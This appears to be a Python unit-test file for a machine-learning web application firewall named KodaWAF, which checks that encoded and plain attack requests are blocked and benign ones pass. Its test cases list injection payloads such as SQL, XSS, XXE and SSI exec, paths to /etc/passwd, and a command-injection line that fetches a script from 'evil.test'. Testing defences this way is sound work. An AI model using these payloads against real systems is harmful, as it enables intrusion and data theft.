from __future__ import annotations

import base64
import tempfile
import unittest
from pathlib import Path

from engine import KodaWAF, RequestView, extract_features
from evaluate import evaluate

ROOT = Path(__file__).resolve().parents[2]
MODEL_PATH = ROOT / "models" / "koda-waf.pkl"


class FeatureExtractionTests(unittest.TestCase):
    def test_encoded_attack_features_do_not_require_a_model(self) -> None:
        encoded = base64.b64encode(b"<script>alert(1)</script>").decode()
        features = extract_features(RequestView(path="/search", query=f"q={encoded}"))
        self.assertIn("signature:xss", features)

    def test_ordinary_request_has_no_attack_signature(self) -> None:
        features = extract_features(RequestView(path="/products", query="page=2&sort=price"))
        self.assertFalse(any(feature.startswith("signature:") for feature in features))


class KodaWAFTests(unittest.TestCase):
    def setUp(self) -> None:
        if not MODEL_PATH.exists():
            self.skipTest("download or train models/koda-waf.pkl to run model integration tests")
        self.root = ROOT
        self.waf = KodaWAF.from_model(MODEL_PATH)

    def assert_blocked(self, payload: str, reason: str) -> None:
        decision = self.waf.inspect(RequestView(path="/search", query=f"q={payload}"))
        self.assertTrue(decision.blocked, payload)
        self.assertIn(reason, decision.reasons)

    def test_attack_families(self) -> None:
        cases = [
            ("1 UNION SELECT password FROM users", "sql_injection"),
            ("<svg onload=alert(document.domain)>", "xss"),
            ("../../etc/passwd", "path_traversal"),
            (";wget http://evil.test/a.sh", "command_injection"),
            ("%0d%0aSet-Cookie:owned=yes", "crlf_or_mail_injection"),
            ("(&(uid=admin)(objectclass=*))", "ldap_injection"),
            ("true, $where: '99 == 88'", "nosql_injection"),
            ('<!--#exec cmd="id" -->', "server_side_include"),
            ("{{1337*1338}}", "template_injection"),
            ('<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>', "xml_external_entity"),
        ]
        for payload, reason in cases:
            with self.subTest(reason=reason):
                self.assert_blocked(payload, reason)

    def test_recursive_encoding(self) -> None:
        encoded = base64.b64encode(b"<script>alert(1)</script>").decode()
        encoded_features = extract_features(RequestView(path="/search", query=f"q={encoded}"))
        self.assertIn("signature:xss", encoded_features)
        self.assert_blocked("%253Csvg%2520onload%253Dalert(1)%253E", "xss")

    def test_benign_contexts(self) -> None:
        for payload in ("union was a great select", "curl and divergence", "JavaScript: Basics of JavaScript Language"):
            with self.subTest(payload=payload):
                decision = self.waf.inspect(RequestView(query=f"q={payload}"))
                self.assertFalse(decision.blocked)

        self.assertFalse(self.waf.inspect(RequestView(path="/", query="page=2&sort=asc")).blocked)

    def test_frozen_external_corpus_is_loadable(self) -> None:
        result = evaluate(
            self.root / "data" / "koda-waf-test.jsonl",
            self.root / "models" / "koda-waf.pkl",
        )
        self.assertEqual(result["rows"], 24)


if __name__ == "__main__":
    unittest.main()
